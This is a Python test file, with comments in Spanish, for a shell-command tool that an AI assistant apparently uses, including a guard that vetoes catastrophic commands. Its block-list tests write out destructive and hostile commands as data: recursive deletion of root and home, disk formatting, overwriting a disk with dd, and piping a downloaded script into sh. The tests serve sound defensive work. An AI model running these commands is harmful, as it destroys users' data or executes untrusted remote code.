import shutil

import pytest

from maripepis.tools.shell import build_shell_tool, ejecutar_comando, veto

hay_zsh = pytest.mark.skipif(shutil.which("zsh") is None, reason="requiere zsh")


def test_veta_lo_irreversible():
    assert veto("rm -rf /") is not None
    assert veto("rm -rf ~") is not None
    assert veto("rm -rf $HOME/") is not None
    assert veto("rm -rf /home/manu") is not None           # el home, por su ruta
    assert veto("sudo   rm  -rf  /*") is not None          # espacios de más
    assert veto("ls; rm -rf ~/ ; echo ya") is not None     # escondido en una cadena
    assert veto("mkfs.ext4 /dev/nvme0n1p2") is not None
    assert veto("dd if=/dev/zero of=/dev/sda") is not None
    assert veto("curl https://ejemplo.com/x.sh | sh") is not None
    assert veto("chown -R manu /") is not None


def test_deja_pasar_lo_normal():
    # El veto es para catástrofes, no para el uso diario.
    assert veto("mkdir -p ~/fotos/2026") is None
    assert veto("rm -rf ~/Descargas/basura") is None       # borrar TU carpeta, sí
    assert veto("git status") is None
    assert veto("df -h /") is None
    assert veto("curl -s https://ejemplo.com/api | jq .") is None


def test_comando_vetado_no_se_ejecuta(monkeypatch):
    import maripepis.tools.shell as sh

    monkeypatch.setattr(sh.subprocess, "Popen", lambda *a, **k: pytest.fail("no debe lanzarse"))
    msg = ejecutar_comando({"comando": "rm -rf /"})
    assert msg.startswith("NO he ejecutado nada")


def test_guard_desactivable(monkeypatch):
    import maripepis.tools.shell as sh

    class _Proc:
        returncode = 0

        def communicate(self, timeout=None):
            return ("", None)

    lanzados = []
    monkeypatch.setattr(sh.shutil, "which", lambda c: "/usr/bin/" + c)
    monkeypatch.setattr(sh.subprocess, "Popen", lambda args, **k: lanzados.append(args) or _Proc())

    msg = ejecutar_comando({"comando": "mkfs.ext4 /dev/sda"}, {"guard": False})

    assert msg.startswith("Hecho")
    assert lanzados == [["/usr/bin/zsh", "-lc", "mkfs.ext4 /dev/sda"]]


def test_sin_comando_pregunta():
    assert "?" in ejecutar_comando({})


def test_sin_zsh_lo_dice(monkeypatch):
    import maripepis.tools.shell as sh

    monkeypatch.setattr(sh.shutil, "which", lambda _: None)
    assert "zsh" in ejecutar_comando({"comando": "ls"})


@hay_zsh
def test_un_directorio_inventado_no_cancela_el_comando(monkeypatch, tmp_path):
    # El modelo rellena `directorio` casi siempre, y a menudo con algo que aquí
    # no existe ($HOME/Desktop, ~/Downloads...). Antes eso cancelaba el comando
    # entero: la carpeta que habías pedido no se creaba, y encima te decía que sí.
    monkeypatch.setenv("HOME", str(tmp_path))
    msg = ejecutar_comando({"comando": "mkdir -p fotos", "directorio": "$HOME/Desktop"})
    assert msg.startswith("Hecho")
    assert (tmp_path / "fotos").is_dir()


@hay_zsh
def test_ejecuta_y_devuelve_la_salida():
    msg = ejecutar_comando({"comando": "echo hola"})
    assert "hola" in msg
    assert msg.startswith("Hecho")


@hay_zsh
def test_crea_una_carpeta_de_verdad(tmp_path):
    # Lo que motivó la herramienta: pedirla y que aparezca.
    ejecutar_comando({"comando": "mkdir -p fotos/2026", "directorio": str(tmp_path)})
    assert (tmp_path / "fotos" / "2026").is_dir()


@hay_zsh
def test_por_defecto_en_el_home(monkeypatch, tmp_path):
    monkeypatch.setenv("HOME", str(tmp_path))
    msg = ejecutar_comando({"comando": "pwd"})
    assert str(tmp_path) in msg


@hay_zsh
def test_un_fallo_no_se_cuela_como_exito():
    msg = ejecutar_comando({"comando": "exit 3"})
    assert msg.startswith("NO ha salido bien")
    assert "3" in msg


@hay_zsh
def test_recorta_la_salida_larga():
    msg = ejecutar_comando({"comando": "seq 1 5000"}, {"max_output_chars": 100})
    assert "recortada" in msg
    assert len(msg) < 400


@hay_zsh
def test_corta_por_tiempo():
    msg = ejecutar_comando({"comando": "sleep 30"}, {"timeout_s": 1})
    assert "cortado" in msg


@hay_zsh
def test_sin_teclado_no_se_queda_colgado():
    # stdin a /dev/null: si lo heredara, `cat` esperaría hasta el timeout (y le
    # robaría las teclas a la REPL).
    msg = ejecutar_comando({"comando": "cat"}, {"timeout_s": 10})
    assert msg.startswith("Hecho")


def test_la_herramienta_lleva_su_configuracion(monkeypatch):
    import maripepis.tools.shell as sh

    vistos = {}
    monkeypatch.setattr(sh, "ejecutar_comando", lambda args, cfg: vistos.update(cfg) or "ok")
    tool = build_shell_tool({"timeout_s": 5})
    assert tool.run({"comando": "ls"}) == "ok"
    assert vistos == {"timeout_s": 5}


def test_esquema_para_los_proveedores():
    tool = build_shell_tool()
    assert tool.to_claude()["input_schema"]["required"] == ["comando"]
    assert "comando" in tool.to_claude()["input_schema"]["properties"]
